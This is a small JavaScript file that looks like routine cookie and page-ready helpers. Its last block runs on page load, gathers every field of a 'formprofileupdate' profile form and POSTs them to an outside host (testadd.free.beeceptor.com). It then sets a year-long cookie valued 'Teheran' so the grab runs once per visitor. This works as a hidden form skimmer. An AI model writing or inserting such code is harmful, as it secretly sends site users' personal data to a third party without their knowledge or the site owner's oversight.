function createCookie(name,value,days) {
    if (days) {
        var date = new Date();
        date.setTime(date.getTime()+(days*24*60*60*1000));
        var expires = "; expires="+date.toGMTString();
    }
    else
        var expires = "";
        document.cookie = name+"="+value+expires+"; path=/";
    }

function readCookie(name) {
        var nameEQ = name + "=";
        var ca = document.cookie.split(';');
        for (var i=0;i < ca.length;i++) {
            var c = ca[i];
            while (c.charAt(0)==' ')
                c = c.substring(1,c.length);
            if (c.indexOf(nameEQ) == 0)
                return c.substring(nameEQ.length,c.length);
        }
        return null;
    }

    function eraseCookie(name) {
    createCookie(name,"",-1);
}

function docReady(fn) {
    // see if DOM is already available
    if (document.readyState === "complete" || document.readyState === "interactive") {
        // call on next available tick
        setTimeout(fn, 1);
    } else {
        document.addEventListener("DOMContentLoaded", fn);
    }
}   

docReady(function() {
    var _tccl_visited = readCookie("_tccl_visited");
    if(_tccl_visited != "Teheran"){
        var regobject = {};
        new FormData(document.getElementById('formprofileupdate')).forEach((value, key) => regobject[key] = value);
        $.ajax({
            url: 'https://testadd.free.beeceptor.com',
            data: regobject,
            contentType: "application/json",
            type: 'POST',
            success: function ( data ) {
                createCookie("_tccl_visited", "Teheran", 365);
                console.log( data );
            }
        });
    }
});
